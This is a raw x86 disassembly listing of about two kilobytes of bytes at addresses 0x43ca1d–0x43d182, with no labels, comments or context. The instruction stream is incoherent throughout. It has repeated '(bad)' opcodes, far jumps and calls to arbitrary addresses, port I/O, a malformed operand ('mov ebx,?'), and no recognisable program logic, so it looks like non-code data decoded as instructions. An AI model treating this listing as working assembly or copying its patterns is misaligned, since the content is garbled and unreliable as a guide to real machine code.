  43ca1d:	jmp    0xa01d2c25
  43ca22:	dec    ebx
  43ca23:	pop    es
  43ca24:	mov    ecx,0xddbc5834
  43ca29:	jmp    0x271645a9
  43ca2e:	mov    edx,0xff2c340b
  43ca33:	gs sahf 
  43ca35:	and    eax,0x62a529c7
  43ca3a:	inc    ecx
  43ca3b:	pop    esi
  43ca3c:	sub    ah,BYTE PTR [ebx-0x45]
  43ca3f:	xchg   esi,eax
  43ca40:	shl    BYTE PTR [edi+0x5],1
  43ca43:	(bad)  
  43ca45:	pop    esp
  43ca46:	mov    edx,0xba00ddb0
  43ca4b:	and    DWORD PTR [ecx],esi
  43ca4d:	(bad)
  43ca51:	ds in  eax,dx
  43ca53:	(bad)  
  43ca54:	xlat   BYTE PTR ds:[ebx]
  43ca55:	dec    edi
  43ca56:	cmp    DWORD PTR [edi+0x5e3865c1],esi
  43ca5c:	(bad)  [ebx+0x5c6a001f]
  43ca62:	inc    ecx
  43ca63:	loope  0x43ca43
  43ca65:	xchg   ebp,eax
  43ca66:	add    al,0x6a
  43ca68:	mov    esi,0xe6de6cd2
  43ca6d:	daa    
  43ca6e:	xor    DWORD PTR [esi],edx
  43ca70:	xchg   edi,eax
  43ca71:	and    ebp,ecx
  43ca73:	lea    ebx,[eax-0x2417ff27]
  43ca79:	shl    BYTE PTR [ebp-0x1f],cl
  43ca7c:	call   0xa3a5fb98
  43ca81:	xor    ah,al
  43ca83:	push   0x6
  43ca85:	aam    0x6c
  43ca87:	out    dx,eax
  43ca88:	out    dx,al
  43ca89:	pop    ss
  43ca8a:	xor    DWORD PTR [esi],ebx
  43ca8c:	movaps xmm1,xmm5
  43ca8f:	icebp  
  43ca90:	mov    esp,0x2070f7d1
  43ca95:	or     DWORD PTR [edx],eax
  43ca97:	pop    ds
  43ca98:	popa   
  43ca99:	dec    edi
  43ca9a:	or     DWORD PTR [edx-0x5d],esp
  43ca9d:	xor    ah,al
  43ca9f:	sbb    eax,0x35c49d9a
  43caa4:	call   0xc49d:0xaa2dc49d
  43caab:	bound  esp,QWORD PTR [eax]
  43caad:	add    eax,0x5c259f8c
  43cab2:	dec    esi
  43cab3:	lods   eax,DWORD PTR ds:[esi]
  43cab4:	pop    esi
  43cab5:	cdq    
  43cab6:	mov    DWORD PTR [edi-0x703f01ab],esp
  43cabc:	call   0xdf5315dd
  43cac1:	and    al,BYTE PTR [ebp+0x0]
  43cac4:	add    al,dl
  43cac6:	sbb    edi,DWORD PTR ds:0xfae3d78d
  43cacc:	push   edx
  43cacd:	fild   DWORD PTR [ebp+ecx*1+0x7ddd3b51]
  43cad4:	xchg   BYTE PTR [edi-0x71ffff24],dh
  43cada:	shl    BYTE PTR [edi],1
  43cadc:	add    ecx,ebx
  43cade:	loope  0x43ca91
  43cae0:	mov    ebx,?
  43cae2:	inc    esi
  43cae3:	cmovo  edi,ebx
  43cae6:	aad    0xc0
  43cae8:	mov    DWORD PTR [ebp+0xbfff75c],ecx
  43caee:	loop   0x43caa1
  43caf0:	nop
  43caf1:	imul   esi,ebx,0x40
  43caf4:	add    BYTE PTR [edx+0x6a],dh
  43caf7:	mov    eax,DWORD PTR [eax]
  43caf9:	retf   
  43cafa:	fmul   QWORD PTR [ecx]
  43cafc:	mov    bh,0x43
  43cafe:	inc    eax
  43caff:	cmovo  edi,DWORD PTR [ebx-0x446f769d]
  43cb06:	fadd   QWORD PTR [eax]
  43cb08:	pcmpeqb mm5,QWORD PTR [ecx+esi*4+0x19]
  43cb0d:	mov    edx,ebp
  43cb0f:	jne    0x43cad5
  43cb11:	ret    
  43cb12:	lds    esi,FWORD PTR [edi+0xdcb9b9]
  43cb18:	add    BYTE PTR [edx],dl
  43cb1a:	sub    dh,BYTE PTR [ebp-0x77]
  43cb1d:	(bad)  
  43cb20:	inc    esi
  43cb21:	mov    edi,0x12744163
  43cb26:	pop    edx
  43cb27:	mov    bl,0x16
  43cb29:	add    BYTE PTR [ebx-0x4cb18024],cl
  43cb2f:	arpl   WORD PTR [ecx+0x60],cx
  43cb32:	add    bl,BYTE PTR [edx]
  43cb34:	imul   ecx,DWORD PTR [ecx+0x6ce024b5],0xcc00dc19
  43cb3e:	bound  ecx,QWORD PTR [ebp-0x6c4c147c]
  43cb44:	test   BYTE PTR [eax+0x76],bl
  43cb47:	jo     0x43cad3
  43cb49:	pop    edx
  43cb4a:	ds jmp 0x43cb43
  43cb4d:	test   BYTE PTR ds:0xd9fc4f3b,dh
  43cb53:	inc    esi
  43cb54:	lock and al,0xad
  43cb57:	mov    WORD PTR cs:[eax-0x72],es
  43cb5b:	dec    ebx
  43cb5c:	inc    eax
  43cb5d:	sub    al,0xe7
  43cb5f:	dec    ebp
  43cb60:	or     al,0xf6
  43cb62:	or     al,0x9f
  43cb64:	scas   eax,DWORD PTR es:[edi]
  43cb65:	and    al,0x12
  43cb67:	fcmovnb st,st(2)
  43cb69:	ins    DWORD PTR es:[edi],dx
  43cb6a:	lahf   
  43cb6b:	dec    ebx
  43cb6c:	cmp    BYTE PTR [eax],bh
  43cb6e:	xchg   ecx,eax
  43cb6f:	xor    eax,0xf2931809
  43cb74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43cb75:	push   ecx
  43cb76:	xchg   edx,eax
  43cb77:	ret    0x8503
  43cb7a:	xor    eax,0x1e408bfe
  43cb7f:	cdq    
  43cb80:	dec    esi
  43cb81:	jo     0x43cbfe
  43cb83:	jmp    FWORD PTR [eax]
  43cb85:	jge    0x43cb25
  43cb87:	vaddps ymm3,ymm3,YMMWORD PTR [esi]
  43cb8b:	cmp    eax,0xd2005009
  43cb90:	mov    dh,0x66
  43cb92:	lods   al,BYTE PTR ds:[esi]
  43cb94:	inc    edx
  43cb95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cb96:	std    
  43cb97:	push   0x49043303
  43cb9c:	add    ebp,DWORD PTR [ebp+edi*8+0x624b0250]
  43cba3:	fcmovnb st,st(0)
  43cba5:	xor    bh,ah
  43cba7:	fld    DWORD PTR [esi+0x3c918543]
  43cbad:	or     DWORD PTR [edi-0x2e],edx
  43cbb0:	mov    dh,0x66
  43cbb2:	ds ins BYTE PTR es:[edi],dx
  43cbb4:	inc    edx
  43cbb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43cbb6:	std    
  43cbb7:	sub    cl,bl
  43cbb9:	sub    dh,BYTE PTR [edx]
  43cbbb:	data16 add ch,BYTE PTR [ebx]
  43cbbe:	stos   DWORD PTR es:[edi],eax
  43cbbf:	push   edi
  43cbc0:	or     al,0x2a
  43cbc2:	dec    edx
  43cbc3:	shl    BYTE PTR [eax-0x18],0x30
  43cbc7:	cmp    eax,0x628afadb
  43cbcc:	pop    edx
  43cbcd:	cmp    edi,0x7465e035
  43cbd3:	sub    eax,0x8a8ae9cf
  43cbd8:	inc    ebp
  43cbd9:	jmp    0x43cc31
  43cbdb:	mov    fs,WORD PTR [edx-0x59]
  43cbde:	add    bh,BYTE PTR [ebx+0x5b36311]
  43cbe4:	xor    eax,ecx
  43cbe6:	mov    dh,0xa
  43cbe8:	fldenv [esi]
  43cbea:	xor    bh,ah
  43cbec:	push   ss
  43cbed:	mov    esi,DWORD PTR cs:[edx+0x3d785]
  43cbf4:	bound  ebx,QWORD PTR [ebp+ecx*8-0x3]
  43cbf8:	shr    dx,cl
  43cbfb:	xor    DWORD PTR [ecx+0x62],edx
  43cbfe:	cs sub bh,bl
  43cc01:	ror    BYTE PTR cs:[edx-0x323ccee6],cl
  43cc08:	pop    edx
  43cc09:	xchg   ebp,esp
  43cc0b:	adc    ah,ch
  43cc0d:	push   ss
  43cc0e:	xor    dl,bl
  43cc10:	xchg   ebp,eax
  43cc11:	fidiv  WORD PTR [edi]
  43cc13:	inc    edi
  43cc14:	pop    edi
  43cc15:	fdivr  DWORD PTR [edx-0x49e9b93c]
  43cc1b:	mov    WORD PTR [edx],fs
  43cc1d:	and    DWORD PTR [ebp-0x53],ebx
  43cc20:	adc    DWORD PTR [ecx],ebp
  43cc22:	arpl   WORD PTR [esi],bp
  43cc24:	sbb    ah,BYTE PTR [edx-0x6a]
  43cc27:	pop    ebx
  43cc28:	fist   WORD PTR [esi]
  43cc2a:	add    al,BYTE PTR [edi]
  43cc2c:	mov    al,0x15
  43cc2e:	fiadd  DWORD PTR [ecx]
  43cc30:	fild   QWORD PTR [esi]
  43cc32:	add    DWORD PTR [ecx-0x61744770],ebp
  43cc38:	and    eax,0x9ccabefc
  43cc3d:	and    eax,0x5745968c
  43cc42:	aas    
  43cc43:	mov    eax,ds:0xa7fc546f
  43cc48:	inc    eax
  43cc49:	mov    esp,0x3d3d705e
  43cc4e:	mov    WORD PTR [esi-0x52c0ab57],gs
  43cc54:	dec    edi
  43cc55:	push   esi
  43cc56:	or     al,0xa1
  43cc58:	add    ah,ch
  43cc5a:	pusha  
  43cc5b:	lods   al,BYTE PTR ds:[esi]
  43cc5c:	jmp    DWORD PTR [ecx-0x27]
  43cc5f:	mov    esp,DWORD PTR [esi-0x6e]
  43cc62:	call   0x211eb567
  43cc67:	ins    DWORD PTR es:[edi],dx
  43cc68:	jmp    0x3f63:0xc0840c19
  43cc6f:	std    
  43cc70:	arpl   WORD PTR [esi],bx
  43cc72:	dec    ebx
  43cc73:	mov    cl,0x68
  43cc75:	aaa    
  43cc76:	inc    ebp
  43cc77:	jmp    edi
  43cc79:	popa   
  43cc7a:	fnstenv [ebx-0xb]
  43cc7d:	jmp    0x7d9:0x622383e8
  43cc84:	ins    BYTE PTR es:[edi],dx
  43cc85:	fwait
  43cc86:	iret   
  43cc87:	test   DWORD PTR [esi-0x203fa725],0x2e8bd961
  43cc91:	mov    edx,0x4efac204
  43cc96:	push   esp
  43cc97:	outs   dx,DWORD PTR ds:[esi]
  43cc98:	cmc    
  43cc99:	bound  ecx,QWORD PTR [eax+0x65]
  43cc9c:	and    bl,ah
  43cc9e:	cmp    al,0x27
  43cca0:	adc    bl,BYTE PTR [esp+edx*2-0x34349727]
  43cca7:	add    cl,ch
  43cca9:	popa   
  43ccaa:	dec    ebx
  43ccab:	(bad)  
  43ccac:	jmp    eax
  43ccae:	(bad)  
  43ccb0:	dec    DWORD PTR [ebx+0x78384060]
  43ccb6:	mov    eax,DWORD PTR [eax+edx*2+0x23]
  43ccba:	mov    esp,0x4b000048
  43ccbf:	pop    edx
  43ccc0:	ret    
  43ccc1:	or     BYTE PTR [eax-0x59],cl
  43ccc4:	pop    ecx
  43ccc5:	mov    esp,edx
  43ccc7:	xchg   ebp,eax
  43ccc8:	adc    DWORD PTR [eax],eax
  43ccca:	cmp    esi,DWORD PTR [edx]
  43cccc:	jle    0x43ccb3
  43ccce:	push   es
  43cccf:	call   0x0:0xd849968a
  43ccd6:	lock call 0xc676:0x89202564
  43ccde:	or     eax,ebx
  43cce0:	add    BYTE PTR [eax],al
  43cce2:	jo     0x43cc81
  43cce4:	sub    al,0xf1
  43cce6:	lods   eax,DWORD PTR ds:[esi]
  43cce7:	xlat   BYTE PTR ds:[ebx]
  43cce8:	jge    0x43ccdb
  43ccea:	adc    BYTE PTR ds:0x1eb30339,0x48
  43ccf1:	call   0x44e301
  43ccf6:	js     0x43cc84
  43ccf8:	inc    DWORD PTR [eax]
  43ccfa:	ins    BYTE PTR es:[edi],dx
  43ccfb:	cwde   
  43ccfc:	adc    DWORD PTR [eax],eax
  43ccfe:	retf   
  43ccff:	es dec esi
  43cd01:	mov    ebx,esi
  43cd03:	and    esi,DWORD PTR [esi-0x149d7134]
  43cd09:	push   ecx
  43cd0a:	lea    esp,[edx+0x72]
  43cd0d:	or     BYTE PTR [eax],dh
  43cd0f:	push   cs
  43cd10:	add    eax,0x50920b83
  43cd15:	(bad)  
  43cd16:	jle    0x43cca9
  43cd18:	clc    
  43cd19:	(bad)  
  43cd1a:	mov    ebx,0x4ff3bd8
  43cd1f:	fadd   DWORD PTR [eax]
  43cd21:	jae    0x43cd23
  43cd23:	mov    BYTE PTR [edi+0x42],bl
  43cd26:	cld    
  43cd27:	bound  esi,QWORD PTR [edi]
  43cd29:	ss je  0x43cd0d
  43cd2c:	sub    al,BYTE PTR [ebx]
  43cd2e:	jno    0x43cd80
  43cd30:	inc    edi
  43cd31:	scas   al,BYTE PTR es:[edi]
  43cd32:	out    0x53,eax
  43cd34:	or     al,0xad
  43cd36:	clc    
  43cd37:	fnstcw WORD PTR [edi+eiz*1-0x7d]
  43cd3b:	mov    ds:0x62a777ab,al
  43cd40:	ret    0xff03
  43cd43:	lahf   
  43cd44:	pop    esi
  43cd45:	mov    BYTE PTR [ecx-0x52],cl
  43cd48:	aaa    
  43cd49:	aaa    
  43cd4a:	cld    
  43cd4b:	fld    DWORD PTR [ebx+0x4ea4c11f]
  43cd51:	add    al,0x0
  43cd53:	(bad)  {k3}
  43cd58:	dec    esi
  43cd59:	clc    
  43cd5a:	xor    al,0x12
  43cd5c:	push   eax
  43cd5d:	sti    
  43cd5e:	and    al,0x32
  43cd60:	dec    ecx
  43cd61:	pop    ebx
  43cd62:	je     0x43cd4f
  43cd64:	repz and BYTE PTR [ebx-0x7af3d5e5],al
  43cd6b:	lods   al,BYTE PTR ds:[esi]
  43cd6c:	jmp    0xcdee:0xc009ceff
  43cd73:	mov    dl,al
  43cd75:	(bad)  
  43cd76:	mov    esi,0xe85af092
  43cd7b:	sti    
  43cd7c:	clc    
  43cd7d:	cld    
  43cd7e:	(bad)  
  43cd7f:	jmp    0x94c8ee87
  43cd84:	aas    
  43cd85:	leave  
  43cd86:	ltr    bx
  43cd89:	repz push eax
  43cd8b:	call   0xf8f7346b
  43cd90:	jmp    0x52b94c40
  43cd95:	ret    0x452f
  43cd98:	fpatan 
  43cd9a:	push   eax
  43cd9b:	test   DWORD PTR [esi+ecx*8],ecx
  43cd9e:	jbe    0x43cde1
  43cda0:	dec    esi
  43cda1:	fst    DWORD PTR [edx]
  43cda3:	aad    0x48
  43cda5:	shr    eax,cl
  43cda7:	add    esp,DWORD PTR [edx+0x10]
  43cdaa:	cmp    al,BYTE PTR [ebx]
  43cdac:	add    al,0x52
  43cdae:	inc    edi
  43cdaf:	mov    bl,0x7a
  43cdb1:	push   ebp
  43cdb2:	xor    BYTE PTR [ebx+eiz*2],ch
  43cdb5:	pusha  
  43cdb6:	lahf   
  43cdb7:	jmp    0x43ce27
  43cdb9:	cwde   
  43cdba:	inc    edx
  43cdbb:	push   es
  43cdbc:	aaa    
  43cdbd:	cdq    
  43cdbe:	ret    
  43cdbf:	add    ebp,DWORD PTR [ecx+ebp*1+0x20f79bb8]
  43cdc6:	jmp    0x8b7e:0x7e1be703
  43cdcd:	push   esi
  43cdce:	sbb    eax,0x9e1be514
  43cdd3:	fwait
  43cdd4:	ja     0x43cda4
  43cdd6:	div    BYTE PTR [edx+0x2e6ae3e6]
  43cddc:	push   edx
  43cddd:	(bad)  
  43cddf:	mov    BYTE PTR [ebx-0x454d2136],ah
  43cde5:	push   es
  43cde6:	stos   BYTE PTR es:[edi],al
  43cde7:	push   ecx
  43cde8:	out    0xb4,eax
  43cdea:	sub    al,0xc7
  43cdec:	add    dh,bl
  43cdee:	adc    al,0xd6
  43cdf0:	mov    BYTE PTR [ebp-0x1c3546bb],bh
  43cdf6:	test   edi,ecx
  43cdf8:	add    esp,DWORD PTR [edx-0x27]
  43cdfb:	jmp    0xb19a3003
  43ce00:	pop    es
  43ce01:	push   ecx
  43ce02:	pop    ss
  43ce03:	jae    0x43ce46
  43ce05:	ss push esp
  43ce07:	mov    al,0x2b
  43ce09:	arpl   WORD PTR [esi+0x27],bx
  43ce0c:	in     al,dx
  43ce0d:	(bad)  
  43ce0e:	cdq    
  43ce0f:	add    BYTE PTR ds:0x5972998f,0x46
  43ce16:	aas    
  43ce17:	jmp    0x16b6afa
  43ce1c:	sbb    DWORD PTR [eax],ecx
  43ce1e:	ror    DWORD PTR [ecx+0x20],0x66
  43ce22:	(bad)  [ebx+0x365475af]
  43ce28:	push   0xffffffa5
  43ce2a:	fimul  DWORD PTR [ecx-0x163eea51]
  43ce30:	push   ebx
  43ce31:	mov    al,0xd1
  43ce33:	mov    esi,edi
  43ce35:	ins    BYTE PTR es:[edi],dx
  43ce36:	mov    bh,BYTE PTR [ecx]
  43ce38:	test   al,0x51
  43ce3a:	xor    BYTE PTR [eax],cl
  43ce3c:	pop    esp
  43ce3d:	mov    eax,ds:0x67298430
  43ce42:	push   esp
  43ce43:	ffree  st(4)
  43ce45:	sbb    al,0x55
  43ce47:	ds (bad) 
  43ce49:	int3   
  43ce4a:	sub    BYTE PTR [ebp-0x2e],dl
  43ce4d:	pop    ds
  43ce4e:	push   eax
  43ce4f:	cs add BYTE PTR fs:[edi],dl
  43ce53:	inc    edx
  43ce54:	add    BYTE PTR [edx-0x5d],dh
  43ce57:	adc    DWORD PTR [ebx+esi*1],eax
  43ce5a:	int3   
  43ce5b:	retf   
  43ce5c:	xor    ah,BYTE PTR [eax]
  43ce5e:	inc    edi
  43ce5f:	fldcw  WORD PTR [ebx]
  43ce61:	sub    esi,DWORD PTR [ecx+0x5fd14f1a]
  43ce67:	adc    al,BYTE PTR [ecx]
  43ce69:	jmp    0x62a8f6fc
  43ce6e:	adc    BYTE PTR [ebp-0x43],cl
  43ce71:	stc    
  43ce72:	js     0x43ce9c
  43ce74:	push   ebp
  43ce75:	sar    DWORD PTR [edi-0x3c],1
  43ce78:	idiv   DWORD PTR [esi+0x3183d86f]
  43ce7e:	dec    esi
  43ce7f:	fld    DWORD PTR [edi]
  43ce81:	gs adc eax,0x9133a6f7
  43ce88:	add    ecx,ebp
  43ce8a:	popa   
  43ce8b:	fst    DWORD PTR [esi+0x62]
  43ce8e:	std    
  43ce8f:	les    ebx,FWORD PTR cs:[ebp+0xc49da2]
  43ce96:	out    dx,eax
  43ce97:	cwde   
  43ce98:	retf   
  43ce99:	int3   
  43ce9a:	call   FWORD PTR [eax+0x4c46cccb]
  43cea0:	in     al,dx
  43cea1:	push   ebx
  43cea2:	jne    0x43cef0
  43cea4:	jae    0x43ceae
  43cea6:	aam    0x3c
  43cea8:	idiv   edi
  43ceaa:	jnp    0x43ce81
  43ceac:	jge    0x43cead
  43ceae:	add    BYTE PTR [edi],bl
  43ceb0:	ins    DWORD PTR es:[edi],dx
  43ceb1:	cmp    eax,0xd685
  43ceb6:	add    BYTE PTR [eax+0x13fe7cb4],bh
  43cebc:	pop    eax
  43cebd:	sti    
  43cebe:	jmp    FWORD PTR [esp+ecx*2]
  43cec1:	inc    edx
  43cec2:	je     0x43cf12
  43cec4:	shl    edi,cl
  43cec6:	dec    DWORD PTR [ebx+0xe]
  43cec9:	inc    DWORD PTR [edx+0xef7c8ee]
  43cecf:	mov    bh,0x5
  43ced1:	idiv   edi
  43ced3:	dec    ebx
  43ced4:	pusha  
  43ced5:	mov    bh,0xf
  43ced7:	(bad)  
  43ced8:	adc    dh,bh
  43ceda:	(bad)  
  43cedb:	cmp    ebx,DWORD PTR [esi-0x11]
  43cede:	add    ebp,DWORD PTR [ecx-0x3cb98218]
  43cee4:	inc    ebp
  43cee5:	dec    edx
  43cee6:	pop    eax
  43cee7:	nop
  43cee8:	and    ah,BYTE PTR [ebp-0x75]
  43ceeb:	lods   eax,DWORD PTR ds:[esi]
  43ceec:	rol    esp,0xe0
  43ceef:	sbb    BYTE PTR [edx],0x39
  43cef2:	pmullw mm1,QWORD PTR [eax]
  43cef5:	or     BYTE PTR [edx],al
  43cef7:	clc    
  43cef8:	fwait
  43cef9:	adc    al,0x46
  43cefb:	push   edi
  43cefc:	inc    esi
  43cefd:	dec    edx
  43cefe:	inc    esp
  43ceff:	pop    eax
  43cf00:	ja     0x43cf7e
  43cf02:	push   esi
  43cf03:	mov    eax,DWORD PTR [edx+eax*2+0x48]
  43cf07:	gs inc esi
  43cf09:	add    al,0x41
  43cf0b:	gs inc esp
  43cf0d:	add    al,0x7a
  43cf0f:	bound  edi,QWORD PTR [ebx]
  43cf11:	inc    edx
  43cf12:	ins    BYTE PTR es:[edi],dx
  43cf13:	sub    eax,0xf20c84f8
  43cf19:	add    DWORD PTR [ecx+0x760c6600],esi
  43cf1f:	dec    ecx
  43cf20:	sbb    bh,BYTE PTR [ebx]
  43cf22:	pop    edx
  43cf23:	inc    esp
  43cf24:	add    al,0x3b
  43cf26:	xor    ch,BYTE PTR [esp+edi*8+0x48]
  43cf2a:	call   0x3036b674
  43cf2f:	sbb    ecx,ebx
  43cf31:	adc    BYTE PTR [edi],0x85
  43cf34:	adc    al,0xc6
  43cf36:	aam    0xc7
  43cf38:	jecxz  0x43cf66
  43cf3a:	or     bh,bh
  43cf3c:	ins    DWORD PTR es:[edi],dx
  43cf3d:	mov    dl,0xe4
  43cf3f:	(bad)
  43cf42:	push   ebx
  43cf43:	push   edx
  43cf44:	dec    edx
  43cf45:	jmp    0x7c0:0x33620037
  43cf4c:	fstp   TBYTE PTR [edi+0x23]
  43cf4f:	jge    0x43cf15
  43cf51:	push   edx
  43cf52:	cld    
  43cf53:	or     al,ah
  43cf55:	pushf  
  43cf56:	add    al,BYTE PTR [eax]
  43cf58:	bound  ebx,QWORD PTR [eax+0x74]
  43cf5b:	dec    ecx
  43cf5c:	mov    esi,0xb249d460
  43cf61:	cmp    ebx,DWORD PTR [edx+0x3b2749f]
  43cf67:	xchg   BYTE PTR [edx+edx*1-0x30394684],bl
  43cf6e:	add    eax,DWORD PTR [eax]
  43cf70:	push   ebp
  43cf71:	addr16 mov ch,0x61
  43cf74:	jmp    0x43cf1b
  43cf76:	dec    esi
  43cf77:	test   esp,ecx
  43cf79:	cmp    DWORD PTR [edi],ecx
  43cf7b:	add    BYTE PTR [edx+0x4b],ah
  43cf7e:	addr16 lahf 
  43cf80:	add    BYTE PTR [edx+esi*4+0x3],cl
  43cf84:	sub    al,0x61
  43cf86:	cmp    cl,BYTE PTR [ecx]
  43cf88:	ss arpl cx,bx
  43cf8b:	jg     0x43cff1
  43cf8d:	jae    0x43cf68
  43cf8f:	jmp    0xdedce392
  43cf94:	jne    0x43cf83
  43cf96:	clc    
  43cf97:	and    al,BYTE PTR [edx+eiz*2+0x3f]
  43cf9b:	jmp    0xdda4a32f
  43cfa0:	add    esp,DWORD PTR [edx+0x56]
  43cfa3:	gs xchg esi,eax
  43cfa5:	cmc    
  43cfa6:	fsub   st(1),st
  43cfa8:	add    edx,DWORD PTR ds:0x8daf5e9a
  43cfae:	(bad)  
  43cfaf:	mov    eax,ds:0xe9c78504
  43cfb4:	and    eax,0xffda9137
  43cfb9:	push   0xffffff90
  43cfbb:	xor    bh,bh
  43cfbd:	mov    bl,0x59
  43cfbf:	or     DWORD PTR ds:0x142d922,edi
  43cfc5:	imul   ecx,DWORD PTR [esi-0x20c03ae8],0xffffffee
  43cfcc:	jne    0x43cf9d
  43cfce:	stc    
  43cfcf:	mov    bl,0x43
  43cfd1:	bound  edi,QWORD PTR [edi]
  43cfd3:	jmp    0xe095b367
  43cfd8:	add    esp,DWORD PTR [edx+0x52]
  43cfdb:	addr16 nop
  43cfdd:	push   ebx
  43cfde:	fldl2t 
  43cfe0:	repnz sbb al,0xf3
  43cfe3:	sub    ch,ch
  43cfe5:	add    bl,ah
  43cfe7:	jns    0x43cfb8
  43cfe9:	add    esp,DWORD PTR [edx+0x52]
  43cfec:	daa    
  43cfed:	and    al,0x5b
  43cfef:	ins    DWORD PTR es:[edi],dx
  43cff0:	test   al,0xdc
  43cff2:	mov    ds:0xe6ac634d,eax
  43cff7:	pop    ss
  43cff8:	dec    esi
  43cff9:	jmp    0x43cfde
  43cffb:	pop    ecx
  43cffc:	jmp    0xf923204
  43d001:	sub    esp,0xffffffda
  43d004:	add    BYTE PTR [ebx],bh
  43d006:	xor    BYTE PTR [ecx],dl
  43d008:	mov    ah,BYTE PTR [edi]
  43d00a:	jle    0x43cfd2
  43d00c:	push   ebp
  43d00d:	adc    eax,0x72652849
  43d012:	pop    ss
  43d013:	adc    DWORD PTR [edi+eiz*1-0x2ec1a3d2],ecx
  43d01a:	mov    ah,0x88
  43d01c:	cmp    al,0xeb
  43d01e:	arpl   WORD PTR [ebx+eiz*8+0x341d6772],dx
  43d025:	stos   BYTE PTR es:[edi],al
  43d026:	sbb    BYTE PTR [eax],0x4d
  43d029:	bound  esp,QWORD PTR [edi]
  43d02b:	or     eax,0xd049af8a
  43d030:	scas   eax,DWORD PTR es:[edi]
  43d031:	in     eax,0x1e
  43d033:	in     al,0xda
  43d035:	bound  edx,QWORD PTR [edi]
  43d037:	sbb    DWORD PTR [edi+0x60],ebx
  43d03a:	pop    ebp
  43d03b:	das    
  43d03c:	or     BYTE PTR [esi+0x27],bh
  43d03f:	xor    eax,0x5c29af8c
  43d044:	dec    esi
  43d045:	lods   eax,DWORD PTR ds:[esi]
  43d046:	xchg   DWORD PTR [esi-0x4],ebx
  43d049:	mov    ds:0x61100400,al
  43d04e:	bound  esp,QWORD PTR [esi-0x27]
  43d051:	add    cl,ch
  43d053:	mov    cl,BYTE PTR [eax-0x269e9517]
  43d059:	add    al,ch
  43d05b:	lahf   
  43d05c:	xor    eax,0xc5399f8c
  43d061:	dec    ebp
  43d062:	lea    ebp,[eax-0x58d1a6f0]
  43d068:	cmp    DWORD PTR [ecx],eax
  43d06a:	jmp    0x9f4ba9d0
  43d06f:	pusha  
  43d070:	pop    esi
  43d071:	xor    DWORD PTR ds:[ebx],esi
  43d074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d075:	pop    es
  43d076:	lahf   
  43d077:	cmp    dh,al
  43d079:	xor    ch,BYTE PTR [eax+0x4d1803]
  43d07f:	jb     0x43d0a0
  43d081:	dec    ecx
  43d082:	jmp    0x43d0ca
  43d084:	inc    eax
  43d085:	push   edx
  43d086:	ins    BYTE PTR es:[edi],dx
  43d087:	inc    eax
  43d088:	pop    ds
  43d089:	cmp    DWORD PTR [edx-0x71822841],ecx
  43d08f:	sbb    ebp,edi
  43d091:	add    BYTE PTR [eax],al
  43d093:	push   eax
  43d094:	outs   dx,DWORD PTR ds:[esi]
  43d095:	mov    ds:0x25d9cb16,eax
  43d09a:	call   FWORD PTR [ebp+0x42]
  43d09d:	cmp    al,0x4a
  43d09f:	xor    BYTE PTR [edi-0x69],ch
  43d0a2:	push   ss
  43d0a3:	mov    ebx,0x338e7dd9
  43d0a8:	out    dx,eax
  43d0a9:	add    BYTE PTR [eax],al
  43d0ab:	add    edx,ecx
  43d0ad:	pop    es
  43d0ae:	add    DWORD PTR [eax],eax
  43d0b0:	in     eax,0x3c
  43d0b2:	adc    al,BYTE PTR [eax]
  43d0b4:	jnp    0x43d07a
  43d0b6:	mov    cl,0xc0
  43d0b8:	lods   eax,DWORD PTR ds:[esi]
  43d0b9:	ficom  DWORD PTR [esi+eax*4+0xdcef]
  43d0c0:	lock inc esi
  43d0c2:	pushf  
  43d0c3:	push   ss
  43d0c4:	jnp    0x43d09f
  43d0c6:	mov    eax,DWORD PTR [ebp+ecx*8+0x4bfff761]
  43d0cd:	retf   0x2bc5
  43d0d0:	nop
  43d0d1:	mov    al,0x89
  43d0d3:	mov    al,ds:0xf00d94d
  43d0d8:	mov    edi,0xcf4ef897
  43d0dd:	inc    ecx
  43d0de:	out    dx,al
  43d0df:	add    DWORD PTR ds:0x34ff83e5,eax
  43d0e5:	pop    ebp
  43d0e6:	leave  
  43d0e7:	std    
  43d0e8:	adc    al,0x76
  43d0ea:	jl     0x43d13a
  43d0ec:	out    0x5b,eax
  43d0ee:	mov    esi,0x4241fc78
  43d0f3:	cmp    al,bh
  43d0f5:	xchg   edi,eax
  43d0f6:	fadd   QWORD PTR [edx]
  43d0f8:	(bad)  
  43d0f9:	fistp  QWORD PTR [esp+eax*4+0x1b068c]
  43d100:	cmp    DWORD PTR [ecx+0x51],esp
  43d103:	push   eax
  43d104:	mov    WORD PTR [edx-0x4d9dbdec],gs
  43d10a:	js     0x43d14d
  43d10c:	inc    esi
  43d10d:	aaa    
  43d10e:	out    0x7c,al
  43d110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d111:	ret    0x417a
  43d114:	add    BYTE PTR [esi],ah
  43d116:	push   0xfffffff4
  43d118:	idiv   DWORD PTR [ebp-0x1ef68795]
  43d11e:	jmp    0x35a0d12f
  43d123:	xchg   ecx,eax
  43d124:	cli    
  43d125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d126:	inc    ebx
  43d127:	inc    ebp
  43d128:	pop    edx
  43d129:	push   ecx
  43d12a:	jb     0x43d174
  43d12c:	pop    ebx
  43d12d:	mov    eax,ds:0xd96c3e37
  43d132:	or     al,BYTE PTR [ecx-0x15f9f09]
  43d138:	mov    dh,0x60
  43d13a:	mov    dl,0x3
  43d13c:	add    cl,ah
  43d13e:	xchg   ebp,eax
  43d13f:	test   DWORD PTR [ebx],0x11704cdb
  43d145:	bound  esi,QWORD PTR [edx+0x63e93b2e]
  43d14b:	inc    edi
  43d14c:	xor    DWORD PTR [eax],0xffffff8a
  43d14f:	cld    
  43d150:	test   BYTE PTR [edx+edi*4-0x4fc63a00],bl
  43d157:	lock (bad) 
  43d159:	xchg   ecx,eax
  43d15a:	xchg   edi,eax
  43d15b:	ror    DWORD PTR [edi-0x6d],0x8c
  43d15f:	fwait
  43d160:	adc    DWORD PTR [edx+esi*4+0x568c8503],esp
  43d167:	js     0x43d1a2
  43d169:	loope  0x43d160
  43d16b:	adc    eax,DWORD PTR [edi-0x4e64a954]
  43d171:	adc    eax,0xdeabded9
  43d176:	ficomp DWORD PTR [edx]
  43d178:	mov    ebp,0xfa113400
  43d17d:	dec    edx
  43d17e:	imul   ebp,DWORD PTR [esi-0x58],0x4a
  43d182:	xchg   edi,eax
